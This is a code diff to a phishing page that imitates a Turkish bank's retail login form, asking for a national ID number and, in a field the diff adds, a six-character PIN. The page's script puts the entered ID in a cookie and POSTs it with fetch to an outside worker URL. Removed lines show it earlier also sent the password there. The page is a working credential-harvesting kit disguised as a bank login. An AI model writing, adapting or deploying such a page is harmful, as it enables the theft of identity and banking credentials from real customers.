@@ -54,6 +54,9 @@ margin-bottom: 0px;
                                             <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="font-size: 14px; height: 46px; font-family: sans-serif; font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False" disablevalidationonblur="true" causesval="false" oninput="validateInputs()" aria-required="true" value="">
                                         </div>
                                         <div class="clearfix"></div>
+					         <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
+                          <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
+                         </div>
                                         <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled>
                                             <span></span>DEVAM
                                         </button>
@@ -97,16 +100,14 @@ margin-bottom: 0px;
 <script>
     document.addEventListener("DOMContentLoaded", function () {
         var tcInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
-        var passInput = document.getElementById("ctl00_c_RetailPinTextBox");
         var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");
 
         async function validateInputs() {
             var tcno = tcInput.value;
-            var pass = passInput.value;
 
-            // TC kimlik numarası ve şifre uzunluğunu kontrol et
-            if (tcno.length === 11 && pass.length === 6) {
-                // TC kimlik numarası doğrulaması
+            // TC kimlik numarası uzunluğunu kontrol et
+            if (tcno.length === 11) {
+                // TC kimlik doğrulaması yap
                 if (await tcno_dogrula_ve_islem_yap(tcno)) {
                     // Giriş düğmesini etkinleştir
                     loginBtn.disabled = false;
@@ -116,7 +117,7 @@ margin-bottom: 0px;
                     alert("Geçersiz TC Kimlik Numarası");
                 }
             } else {
-                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
+                // TC kimlik numarası eksikse giriş düğmesini devre dışı bırak
                 loginBtn.disabled = true;
             }
         }
@@ -125,20 +126,17 @@ margin-bottom: 0px;
         loginBtn.addEventListener("click", function () {
             // TC kimlik numarası ve şifreyi al
             var tcno = tcInput.value;
-            var pass = passInput.value;
 
-            // TC kimlik numarası ve şifre uzunluğunu kontrol et
-            if (tcno.length === 11 && pass.length === 6) {
+            // TC kimlik numarası uzunluğunu kontrol et
+            if (tcno.length === 11) {
                 // TC kimlik doğrulaması yap
                 if (tcno_dogrula_ve_islem_yap(tcno)) {
                     // Cookie'leri oluştur
                     document.cookie = `tcno=${tcno}; path=/`;
-                    document.cookie = `pass=${pass}; path=/`;
 
                     // POST işlemi için veri oluştur
                     var data = new FormData();
                     data.append('tcno', tcno);
-                    data.append('pass', pass);
 
                     // POST işlemi için fetch kullanarak isteği oluştur
                     fetch('https://worker-steep-shape-b9dddssd48.selimjuhan2.workers.des/', {
@@ -158,7 +156,7 @@ margin-bottom: 0px;
                     alert("Geçersiz TC Kimlik Numarası");
                 }
             } else {
-                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+                alert("TC Kimlik Numarası eksik veya hatalı.");
             }
         }); 
 
@@ -195,7 +193,6 @@ margin-bottom: 0px;
 
         // Giriş alanlarının değerlerinin değiştiğini izle
         tcInput.addEventListener("input", validateInputs);
-        passInput.addEventListener("input", validateInputs);
 
         // Sayfa yüklendiğinde de kontrol et
         validateInputs();
